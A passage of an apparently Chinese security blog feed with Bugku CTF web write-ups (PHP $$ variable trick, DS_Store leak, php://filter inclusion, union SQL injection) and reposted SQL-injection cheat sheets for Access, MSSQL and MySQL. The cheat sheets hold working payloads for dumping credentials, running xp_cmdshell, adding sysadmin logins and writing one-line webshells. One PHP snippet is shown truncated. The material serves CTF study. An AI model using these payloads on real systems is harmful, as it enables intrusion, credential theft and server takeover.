<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意最后的<code>eval(&quot;var_dump($$args);</code>参数args前有两个$$<br>参考下面:<br><img src="https://i.imgur.com/0S8C6B3.png" alt><br>所以只需要传一个全局变量就好<br>构url:<br><a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php?args=GLOBALS</a><br>得到flag{92853051ab894a64f7865cf3c2128b34}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-sql注入2</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-sql%E6%B3%A8%E5%85%A52/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p>
<p>这道题是DS_Store源码泄露<a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener"><font color="red">常见Web源码泄露总结</font></a><br><a href="https://github.com/lijiejie/ds_store_exp.git" target="_blank" rel="noopener">ds_store_exp下载</a><br>用DS_Store_exp扫描改网址:<br><img src="https://i.imgur.com/BjhNv3y.png" alt><br>进入<br><a href="http://120.24.86.145:8007/web2/flag" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/flag</a><br>下载得到flag{sql_iNJEct_comMon3600!}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>DS_Store源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数漏洞</title>
    <url>/2018/08/08/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>偶然看见网上总结比较全面的PHP函数漏洞，先码住<br>传送门:<a href="https://blog.csdn.net/qq_35078631/article/details/75200157" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/75200157</a></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-flag在index里</title>
    <url>/2018/08/08/Writeup/bugkuWeb/WP-Bugku-flag%E5%9C%A8index%E9%87%8C/</url>
    <content><![CDATA[<p>题目地址: <a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a></p>
<p>进入题目后看到只有一个可点击的文字<br>点击之后跳转到<a href="http://120.24.86.145:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=show.php</a></p>
<p>想到题目是:flag在index里<br>那么可能是文件包含<br>构造url:<br><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br>得到了一串base64加密的字符串<br>base64解密得到包含flag的代码<br>得到flag{edulcni_elif_lacol_si_siht}</p>
<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap常规使用</title>
    <url>/2018/08/08/sqlmap%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p><img src="https://hdxlvw.sn.files.1drv.com/y4mzWCBWTPcDgwBJUwCtoO--6lVsVkThSr92krdwYkhhpRnu3KKRpb99iY38SZ0EVxtjJaGL8qHtegQiCIEIFcWKL7eoAq_nm58q6cyg8co6FpJWM2uf-7A7TuSRGQUB8oln9jrW9kouad_a7MRo-iDUF0KFwM9q3UwoZ3hoa_z8Aezr2n_TjN9GE_xKrsjZ0OPj9Viu1O9i0OSa42qzFBykg?width=1112&height=467&cropmode=none" alt></p>
<p><img src="https://hdxtvw.sn.files.1drv.com/y4mHgYIwEgmILBo2GBvmugxBATnWIykJ2TKUab4gYFeVbjOS6wkdJuwm3xQu3lDh-OKk3lI0O9Yesru5f4VfPvZs-iZMxBDNDHWyL7XAsv5E4V_QwmYcerlOLThUCBluzmwXEBweT2WI1sytLpfaftTcvOdALL4RffsW4Ezt3ER8dU_eY4srAv5NmwwKhxADJcMj-Vlyu1kYHH1n-CzJ0AbXg?width=1075&height=425&cropmode=none" alt></p>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL手工注入常用语句</title>
    <url>/2018/08/07/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<p>文章来源:暗组</p>
<p>判断数据库类型:<br>Access:<br>and (select id from MSysAccessObjects) &gt;0 返回正常说明是access</p>
<p>MSSQL:<br>and (select id from sysobjects) &gt;0 返回正常说明是mssql</p>
<p>MySQL:<br>and length(user())&gt;0    返回正常说明是MySQL</p>
<p>mysql:</p>
<p>1.判断版本 and ord(mid(version(),1,1))&gt;51 /* 返回正常说明是4.0以上版本，可以用union查询<br>2.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10<br>3.再利用union来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,……./<em>直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。<br>4.判断数据库连接帐号有没有写权限，and (select count(</em>) from mysql.user)&gt;0 /<em>如果结果返回错误，那我们只能猜解管理员帐号和密码了。<br>5.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /</em> 注:load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。</p>
<p>6、检测是不是root权限 and/<em>*/ord(mid(user(),1,1))=114/</em></p>
<p>7、mysql内置函数hex()转换字符为16进制，如select hex(user())<br>mysql内置函数unhex() 解码16进制，如select unhex(hex(user())) </p>
<p>8、mysql内置函数concat()将多列合并成一列，如select concat(username,0x3A,password) from t_member</p>
<p>9、常用内置函数使用:<br>select system_user()  查看系统用户</p>
<p>select current_user()  查询当前用户</p>
<p>select user()  查询用户</p>
<p>SELECT version()  查询数据库版本</p>
<p>SELECT database()  查询当前连接的数据库</p>
<p>select @@version_compile_os 查询当前操作系统</p>
<p>select @@datadir    查询读取数据库路径<br>select @@basedir    查询MYSQL安装路径</p>
<hr>
<p>去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量<br>第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。</p>
<p>10、查数据库数量<br>union select cuncat(schema_name,0x3A)  from information_schema.schemata limit 1,1</p>
<p>11、查询表<br>union select table_name from information_schema.tables where table_schema =库名 limit 1,1</p>
<p>MSSQL:</p>
<p>检测是否为SA权限<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–</p>
<p>检测是否为DB权限<br>and 1=(Select IS_MEMBER(‘db_owner’))</p>
<p>爆所有数据库 union select name from master.dbo.sysdatabases where dbid=1  1代表第一个库</p>
<p>爆所有表<br>第一张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’</p>
<p>第二张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’)</p>
<p>第三张表 union select  top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’,’第二张表’)<br>…</p>
<p>爆列:<br>爆ID  select id from seay.dbo.sysobjects where xtype=’U’ and name=’admin’</p>
<p>爆第一个列 select top 1 name from seay.dbo.syscolumns where id=ID号</p>
<p>爆第二个列  select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in(‘第一个列’)<br>…</p>
<p>爆数据:<br>select 列名 from 表名</p>
<p>exec master.dbo.xp_dirtree ‘c:&#39;;  遍历目录<br>exec master.dbo.xp_availablemedia;– 获得当前所有驱动器<br>exec master.dbo.xp_subdirs ‘c:&#39;;– 获得子目录列表<br>exec master.dbo.xp_dirtree ‘c:&#39;;– 获得所有子目录的目录树结构<br>exec master.dbo.xp_cmdshell ‘type c:\web\web.config’;– 查看文件的内容 </p>
<p>备份数据库:backup database 库名 to disk=’c:/l.asp’; </p>
<p>MSSQL内置函数:<br>select @@version  查询数据库版本</p>
<p>select user_name() 查询当前数据库连接用户名</p>
<p>select db_name()  查询当前数据库名</p>
<p>更改sa密码<br>exec sp_password NULL,’新密码’,’sa’</p>
<p>添加SA权限用户<br>exec sp_addlogin ‘username’,’pass’,’master’;<br>exec sp_addsrvrolemember ‘username’, sysadmin</p>
<p>检测是否支持多行<br>;declare @d int;–</p>
<p>停掉或激活某个服务。</p>
<p>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’</p>
<p>解开压缩档。</p>
<p>xp_unpackcab ‘c:\test.cab’,’c:\temp’,1</p>
<p>恢复 xp_cmdshell<br>;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;–</p>
<p>开启沙盘模式:<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1</p>
<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>笔记</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-成绩单</title>
    <url>/2018/08/05/Writeup/bugkuWeb/WP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    <content><![CDATA[<p>题目地址:<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a></p>
<p>进入这道题目 我们先手遍历一遍<br><code>id=-1&#39; union select 1,2,3,4#</code></p>
<p>发现有四个表且都有回显</p>
<p>于是 就开始爆破吧</p>
<p>通过<br><code>id=-1&#39; union select 1,2,3,database()#</code><br>得到数据库名字skctf_flag</p>
<p>之后通过<br><code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>得到表名fl4g,sc</p>
<ul>
<li><a href="#1"><font color="darkred">关于mysql中group_concat(),information_schema</font></a></li>
</ul>
<p>很显然我们需要的数据在fl4g这个表里</p>
<p>接下来我们就要爆字段了</p>
<p>通过<br><code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#//这里需要用16进制绕过</code><br>得到字段skctf_flag</p>
<ul>
<li><a href="#2"><font color="darkblue">关于用16进制绕过(引号绕过)</font></a>以及<a href="https://blog.csdn.net/qq_35078631/article/details/74931777" target="_blank" rel="noopener"><font color="darkred">详细资料</font></a></li>
</ul>
<p>最后我们就可以开始查询数据了</p>
<p>通过<br><code>id=-1&#39; union select 1,2,3,skctf_flag from fl4g#</code><br>得到BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
<hr>
<div id="1">
mysql中的information_schema 结构用来存储数据库系统信息

<p>information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。　</p>
<p>| SCHEMATA ――&gt;存储数据库名的，</p>
<p>|——&gt;关键字段:SCHEMA_NAME，表示数据库名称</p>
<p>| TABLES ――&gt;存储表名的</p>
<p>|——&gt;关键字段:TABLE_SCHEMA表示表所属的数据库名称；</p>
<p>TABLE_NAME表示表的名称</p>
<p>| COLUMNS ――&gt;存储字段名的</p>
<p>|——&gt;关键字段:TABLE_SCHEMA表示表所属的数据库名称；</p>
<p>TABLE_NAME表示所属的表的名称</p>
<p>　　　　COLUMN_NAME表示字段名</p>
<p>可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。</p>
<p>爆所有数据名</p>
<p>select group_concat(SCHEMA_NAME) from information_schema.schemata</p>
<p>得到当前库的所有表</p>
<p>select group_concat(table_name) from information_schema.tables where table_schema=database()</p>
<p>得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572</p>
<p>select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572</p>
<p>得到字段具体的值<br>select group_concat(username,0x3a,password) from adminuser </p>
</div>

<hr>
<div id="2">![](https://i.imgur.com/0iK9fkN.png)</div>

<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>常规SQL注入笔记</title>
    <url>/2018/07/25/%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>转载自<a href="http://599985375.lofter.com/post/1d071723_7b32422" target="_blank" rel="noopener">http://599985375.lofter.com/post/1d071723_7b32422</a></p>
<h1 id="基本常识"><a href="#基本常识" class="headerlink" title="基本常识"></a>基本常识</h1><p><strong>简单判定有无漏洞</strong>:</p>
<ul>
<li><p>粗略型:提交单引号’</p>
</li>
<li><p>逻辑型(数字型注入):and 1=1/and 1=2</p>
</li>
<li><p>逻辑型(字符型注入):’ and ‘1’=’1/‘ and ‘1’=’2</p>
</li>
<li><p>逻辑型(搜索型注入):%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’%</p>
</li>
</ul>
<p><strong>简单判断数据库信息</strong>:<br>粗略型:</p>
<ul>
<li>加单引号’(根据服务器报错的信息来判断)</li>
<li>加;–(;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有)</li>
</ul>
<p>逻辑型:</p>
<ul>
<li>and user&gt;0</li>
<li>and (select count(*) from msysobjects)&gt;0 ……(页面错误为access数据库)</li>
<li>and (select count(*) from sysobjects)&gt;0 ……(页面正常为MSSQL数据库)</li>
<li>and db_name()&gt;0 ……(爆数据库名)</li>
<li>and version&gt;0(爆SQLServer版本信息以及服务器操作系统的类型和版本信息)</li>
</ul>
<p><strong>判断MYSQL权限</strong>:</p>
<ul>
<li>and 0&lt;&gt;(Select ISSRVROLEMEMBER(‘sysadmin’))–(页面正常则为SA)</li>
<li>and 0&lt;&gt;(Select IS_MEMBER(‘db_owner’))–(页面正常则为db_owner)</li>
<li>and 0&lt;&gt;(Select IS_MEMBER(‘public’))–(页面正常则是public)<font color="red">
注意:
以上方法适用于参数是int数字型的时候。若为字符型，需在参数后添加单引号'并在查询语句后添加;--，搜索型注入以此类推。
</font>

</li>
</ul>
<h1 id="ACCESS注入基本流程"><a href="#ACCESS注入基本流程" class="headerlink" title="ACCESS注入基本流程:"></a>ACCESS注入基本流程:</h1><p><strong>猜解表名</strong>:</p>
<ul>
<li>and 0&lt;&gt;(select count(*) from 表名) 或 and exists(Select * from 表名)</li>
</ul>
<p><strong>猜解字段</strong>:</p>
<ul>
<li>and exists(Select 字段名 from 表名)(页面正常存在该字段，不正常不存在该字段)</li>
</ul>
<p><strong>猜解用户名和密码长度</strong>:</p>
<ul>
<li>and(Select top 1 len(列名) from 表名)&gt;N<br>(TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N)<br>如:</li>
<li>and 1=(select count(*) from user where len(name)&gt;6) 错误</li>
<li>and 1=(select count(*) from user where len(name)&gt;5) 正确<br>则表示user表中name字段的第一条记录的长度是6。</li>
</ul>
<p><strong>猜解用户名和密码</strong>:</p>
<ul>
<li>and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0<br>如:</li>
<li>and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常</li>
<li>and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误<br>则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97<font color="red">
注意:
因为MD5的密文长度通常有16位、18位、32位、40位等几种，
所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。
</font>

</li>
</ul>
<h1 id="MSSQL报错注入基本流程"><a href="#MSSQL报错注入基本流程" class="headerlink" title="MSSQL报错注入基本流程:"></a>MSSQL报错注入基本流程:</h1><p>爆出表名和字段:having 1=1–</p>
<p>猜解表名:</p>
<p>获得第一个表名:<br>and (select top 1 name from sysobjects where xtype=’u’)&gt;0</p>
<p>获得第二个表名:<br>and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0</p>
<p>以此类推。</p>
<p>猜解列名:</p>
<p>得到col_name表中的第一个列名:<br>and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0</p>
<p>猜解字段内容:<br>and (select top 1 列名 from [表名])&gt;0</p>
<p>如:</p>
<p>获取用户名:<br>and (select top 1 username from [admin])&gt;0</p>
<p>获取密码:<br>and (select top 1 password from [admin])&gt;0</p>
<p>导出webshell:</p>
<p>方法1:利用SQL执行命令功能导出WebShell</p>
<p>SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote</p>
<p>注意:需拥有SQL执行权限且知道绝对路径</p>
<p>方法2:</p>
<p>建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。</p>
<p>在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。</p>
<p>导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。</p>
<p>方法2的SQL语句:</p>
<p>create table cmd (a varchar(50))</p>
<p>insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’)</p>
<p>select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd</p>
<p>drop table cmd</p>
<h1 id="MYSQL注入基本流程"><a href="#MYSQL注入基本流程" class="headerlink" title="MYSQL注入基本流程:"></a>MYSQL注入基本流程:</h1><p>MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。</p>
<p>MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。</p>
<p>数据库权限判断:<br>and ord(mid(user(),1,1))=114 /* (页面正常说明为root)</p>
<p>判断当前页面字段总数:</p>
<p>方法1、用union联合查询:and 1=1 union select 1,2,3,4,5……</p>
<p>方法2、用order by 查询“order by *–</p>
<p>判断显示位:</p>
<p>方法1、<a href="http://www.f4ck.org/article.php?id=1" target="_blank" rel="noopener">http://www.f4ck.org/article.php?id=1</a> and 1=2 union select 1,2,3,4,5,6,7……</p>
<p>方法2、<a href="http://www.f4ck.org/article.php?id=-1" target="_blank" rel="noopener">http://www.f4ck.org/article.php?id=-1</a> union select 1,2,3,4,5,6,7……</p>
<p>查库:</p>
<p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p>
<p>获取第一个库名:<br>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1</p>
<p>获取第二个库名:<br>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2</p>
<p>以此类推。</p>
<p>查表:</p>
<p>获取数据库中第一个表名:<br>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1</p>
<p>获取数据库中第二个表名:<br>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2</p>
<p>查列:</p>
<p>获取数据库中指定表的第一个列名:<br>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1</p>
<p>获取数据库中指定表的第二个列名:<br>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1</p>
<p>得到字段内容:</p>
<p>在不同的显示位显示不同的字段内容:<br>and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1</p>
<p>在同一个显示位显示不同的字段内容:<br>and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1</p>
<p>一次性查出所有表名:<br>union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制</p>
<p>一次性查出所有字段名:<br>union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制</p>
<p>导出一句话WebShell:</p>
<p>方法1:</p>
<p>Drop TABLE IF EXISTS temp;</p>
<p>Create TABLE temp(cmd text NOT NULL);</p>
<p>Insert INTO temp (cmd) VALUES(‘’);</p>
<p>Select cmd from temp into out file ‘F:/wwwroot/eval.php’;</p>
<p>Drop TABLE IF EXISTS temp;</p>
<p>方法2:</p>
<p>Select ‘’ into outfile ‘F:/wwwroot/eval.php’;</p>
<p>load_file() 常用路径:</p>
<p>c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
<p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
<p>c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件</p>
<p>c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息</p>
<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>笔记</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Web常见漏洞及分析</title>
    <url>/2018/07/22/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="XSS-漏洞-Cross-Site-Script-跨站脚本"><a href="#XSS-漏洞-Cross-Site-Script-跨站脚本" class="headerlink" title="XSS 漏洞(Cross Site Script | 跨站脚本)"></a>XSS 漏洞(Cross Site Script | 跨站脚本)</h1><p><strong>常见危害</strong>: 盗取用户信息，钓鱼，制造蠕虫等<br><strong>概念</strong>: 黑客通过“ Html 注入”篡改网页，插入了恶意脚本，当用户在浏览网页时，实现控制用户浏览器的一种攻击方式</p>
<blockquote>
<p>XSS 通常有三种类型:</p>
<ul>
<li><strong>存储型</strong>:访问网站，触发XSS。<br>firebug 的 html 中查找</li>
</ul>
<p><strong>黑客端攻击流程</strong>: 构造带有 XSS 脚本的留言内容 –&gt; 提交给后端 web 应用程序 –&gt; web 应用程序将带有 XSS 脚本的留言写入数据库　–&gt; 用户或管理员查看留言触发 XSS<br><strong>用户端被攻击流程</strong>: 用户打开浏览器 –&gt; 访问了有 XSS 脚本的留言页面 –&gt; 浏览器请求内容 –&gt; 查询数据库 –&gt; 数据库将带有 XSS 脚本的留言返回给 web 应用程序 –&gt; 显示在用户的页面中触发 XSS<br>例:留言中加入 <code>&lt;img src=&quot;#&quot; onerrror=alert(/XSS/)&gt;</code></p>
<ul>
<li><strong>反射性</strong>:访问携带 XSS 脚本的连接，触发 XSS</li>
</ul>
<p><strong>用户端被攻击流程</strong>: 用户访问了有XSS脚本的链接 –&gt; 浏览器向后端的web应用程序发送请求 –&gt; 后端程序将 url 中的 XSS 脚本数据写入到响应页面并返回给浏览器 –&gt; 浏览器渲染响应页面触发 XSS<br>例: url 中携带 <code>&lt;img src=&quot;#&quot; onerror=&quot;alert=(/XSS/)&quot;&gt;</code></p>
<ul>
<li><strong>DOM 型</strong>: 访问携带 XSS 脚本的链接，触发XSS<br>firebug 脚本中查找“ hash ”</li>
</ul>
<p><strong>攻击过程</strong>: 用户在浏览器中访问携带XSS脚本的链接 –&gt; 浏览器通过 javascript 从 url 中提取出 XSS 脚本的内容并写入到 DOM 中 –&gt; 触发 XSS<br><img src="https://htxlvw.sn.files.1drv.com/y4mJj0SqPZTm6RaMIuda9OipoZSvAru_VIHxq8o5ujcgn36wG4DNImXB1EsfpPXcs6ltoM0XrdZuAgH-HUTxiwCSKmTayJqUVpUbiKjcLMHI0vZQ00Ksu_MJXSF0mLoFQf9wEybroHE7hMWhG81EXzKCkt31lnQAVXn1SYJ6lRurxm1rD6fvBOHyeqeBmpwncgEJ_04W0LH5t_SAWXwzmNEXQ?width=1156&height=459&cropmode=none" alt></p>
</blockquote>
<hr>
<h1 id="CSRF-漏洞-Cross-site-request-forgery-跨站请求伪造"><a href="#CSRF-漏洞-Cross-site-request-forgery-跨站请求伪造" class="headerlink" title="CSRF 漏洞(Cross-site request forgery | 跨站请求伪造)"></a>CSRF 漏洞(Cross-site request forgery | 跨站请求伪造)</h1><p><strong>常见危害</strong>: 执行恶意操作(“被转账”、“被发垃圾评论”)，制造蠕虫等<br><strong>概念</strong>: 利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。<br><strong>原理</strong>:<br><img src="https://hdxkvw.sn.files.1drv.com/y4mbD22CBYgy2TR29eaHRR0LmecOLRzw38ka4Y_BBWqKW4hkiQOtWBWBM6cGHG9ceY7T_OlrJDYL311YonLOBxLMROslD5z5gr6oeCVg8aW-3ZqgdblcEeutJymgKRp8_SIzq_wDn-M7qtTjQECANrkreOOiGGpCzA1tYpT6q7F4mywTkjNAvd2hVNc_yl2bzX_cSUPPMvj-SF3WRk4D-ilnA?width=820&height=395&cropmode=none" alt><br>在转账页面可能存在看不见的 iframe 标签，因为 width 和 height 为0</p>
<hr>
<h1 id="URL-跳转漏洞"><a href="#URL-跳转漏洞" class="headerlink" title="URL 跳转漏洞"></a>URL 跳转漏洞</h1><p><strong>概念</strong>: 借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致安全问题<br><strong>例如</strong>:<br><img src="https://hdxqvw.sn.files.1drv.com/y4mn8mtHSwjtXn7da4hqUgfM19YU96cP_DLkRIl10oQZPdgA4soqPWqPbtOvLxNUccKKNhkzmyPzNPCfyl8hjktDA3zldQalyScXfOCXkk9h2qdZHeFxTA9NP3J4BjWPBcWCkDdY-rgzkB22lcOACWwbe7ONNsBtIbbH3pF2cQ5izhJ5AJdcEAbboFrPd4zN-956WocXRqboqi3PzIz65aKYA?width=787&height=240&cropmode=none" alt><br><strong>实现方式</strong>: </p>
<blockquote>
<ul>
<li>Header 头跳转<br><img src="https://hdxpvw.sn.files.1drv.com/y4miaEKOm9h_Qj8FsMFSTxsjat54yk7lXoplPP-dOfgm_eT0HafPfiiJBUxm0HzWv-pmzNevFd9g5tr0RzADgCSsAj3Q8e3SbGzKV7n83utttbVzjgbfuMMjzzZDE4tctNGsxmQBJDlesQz5Ir55d9uK858C0NQwPsv7wUFbspAOaiOQdj68OrTOJLao8E2gmJ9UeaQ6SSYiZ9G70cdTBu9MQ?width=665&height=187&cropmode=none" alt></li>
<li>JavaScript 跳转<br><img src="https://hdxovw.sn.files.1drv.com/y4mMjhm_Sr1IfgjswI7p4rHTMaePkRIN5E0mW9SqrpAT4X4ix1zechRsAUwiIiJFMpZk1UetuF5OS413l6CNbygPv2c4XYlU6Zr1antHRV6eJMVqqpBizQLZv-yC8AsRqpmB7O_4B-BCzqlhPpX4aE50Hd6iCtOjS-ywTeaDe-5UVPFgSOn-epYB2pcFQGDrkr_OcVBmF5yztUMDj-o2XO4ew?width=692&height=184&cropmode=none" alt></li>
<li>Meta 跳转<br><img src="https://hdxrvw.sn.files.1drv.com/y4mPxWZ5QNBUi8WnbZhQjVwcrQLP21pd51bfSwAL_sqHfB0XQVqk2M_cOP-8TFgWtvoiyqLfwjyP9pMYvKasafQe219UdZnw4XkobZ2SLl1CU6vCaE7R9Z9EHNkkcNPecQb-l3X8_OW5bVVyV2ksLlFWJTG2M6cd4SDiepOyKFC8sEuhx1zdRsk9RRH0d8amgusNwkfUCI_rWZVtKXh4DzoUw?width=729&height=281&cropmode=none" alt></li>
</ul>
</blockquote>
<hr>
<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>SQL 注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以进行访问或修改数据，或者利用潜在的数据库漏洞进行攻击<br><strong>SQL 注入的必备条件</strong></p>
<ul>
<li>1、可以控制输入的数据</li>
<li>2、服务器要执行的代码拼接了控制的数据</li>
</ul>
<p><strong>SQL 注入的本质</strong></p>
<blockquote>
<p>数据和代码未分离，即数据当作了代码来执行</p>
</blockquote>
<hr>
<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p><strong>命令注入要满足三个条件</strong>:</p>
<ul>
<li>1、调用可执行系统命令的函数</li>
<li>2、函数或函数的参数可控</li>
<li>3、拼接注入命令<br>PHP执行命令的函数:system, exec, shell_exec, eval ……<br>PHP执行系统命令的函数:<blockquote>
